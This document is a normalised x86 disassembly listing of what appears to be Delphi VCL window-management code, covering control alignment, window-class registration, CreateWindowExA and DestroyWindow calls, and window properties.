mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44485d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_4449da
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_444a09 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_444a90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_445284
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_416044
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4161a0
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_444664
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_445248
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41621c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4161a0
mov edx eax
mov ecx ebx
mov eax edi
call sub_4445d8
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_444c00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_445284
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_445248
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_445248
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_444c54
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_444c00
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_444d33
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_444a90
pop ecx
push ebp
mov al 0x2
call sub_444a90
pop ecx
push ebp
mov al 0x3
call sub_444a90
pop ecx
push ebp
mov al 0x4
call sub_444a90
pop ecx
push ebp
mov al 0x5
call sub_444a90
pop ecx
push ebp
mov al 0x6
call sub_444a90
pop ecx
push ebp
xor eax eax
call sub_444a90
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_4038bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_444d58
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444dec
xor eax eax
push ebp
push sub_444ddf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_444df4
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_444e1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_444ee1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441768
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_445284
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444ee8
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445248
mov edx eax
mov eax [ ebp - 0xc ]
call sub_416044
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4414d4
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4161a0
xor ecx ecx
mov edx 0xb03e
call sub_442f30
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445248
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_444ef0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445284
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_444dec
xor edx edx
push ebp
push sub_444fd7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_445284
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445248
mov edx eax
mov eax [ ebp - 0xc ]
call sub_416044
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4161a0
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
call sub_444df4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445248
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_441278
mov dl 0x4
call sub_441278
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_416090
sub_445044
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4592cc
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_45cff4
sub_445064
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_440658
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_440658
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_440658
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_4450b0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_440680
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_440680
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_440680
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_4450f8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4038bc
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_442f30
mov edx ebx
mov eax edi
call sub_445064
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_442f30
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_442f30
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax edi
call sub_448788
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_442f30
mov eax edi
call sub_445c14
jmp r-xdata
mov edx ebx
mov eax edi
call sub_444d58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4451cc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_442f30
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax esi
call sub_448788
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_445044
mov eax ebp
call sub_445a78
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4450b0
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_442f30
mov eax esi
call sub_444e14
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4421ac
sub_445248
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4161a0
mov edx edi
mov eax ebp
call sub_4161a0
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4452a4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_445284
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_445248
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_4452e4
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4452a4
add esp 0x10
retn
sub_44530c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_445378
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4423c0
test al al
je r-xdata
mov eax ebx
call sub_4423f0
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_4038bc
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_4038bc
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_4038bc
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_4453e0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4454fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402fc4
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_445378
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_448484
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403610
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404688
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_409054
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445505
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_44550c
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_445697
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43eb90
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43eb90
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40d2f0
mov eax [ esi + 0x64 ]
call sub_409214
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_448794
push 0x1
mov eax [ esi + 0x68 ]
call sub_421528
mov ecx eax
mov edx 0x30
mov eax esi
call sub_442f30
cmp [ esi + 0x5c ] 0x0
je r-xdata
call sub_40d2f0
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44569e
lea eax [ ebp - 0xc0 ]
call sub_40442c
retn
mov eax esi
mov si 0xffee
call sub_4038bc
mov eax ebx
call sub_448484
mov [ ebp - 0x70 ] eax
jmp r-xdata
sub_4456a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
push 0x0
mov eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
lea eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call CreateWindowExA
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_4456e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41a8a8
mov eax esi
call sub_41a7f8
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41a7f8
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41a8b0
pop esi
pop ebx
retn
sub_445720
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41ca0c
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41c940
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41c940
mov eax esi
call sub_41ca14
add esp 0x10
pop esi
pop ebx
retn
sub_445788
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_445774
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4161a0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4161a0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_445860
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44326c
mov eax [ ebp - 0x8 ]
push eax
push sub_4456e8
mov eax [ ebp - 0x8 ]
push eax
push sub_445720
push ebp
call sub_445788
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4458bc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_441cd8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4091c8
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4091dc
mov ecx eax
mov edx edi
mov eax ebx
call sub_441ce8
mov eax r-xdata
call sub_4091e8
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_44078c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_445914
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_445961
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445968
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40d2f0
sub_445978
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_4161fc
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4161a0
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_4459c0
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_445978
push eax
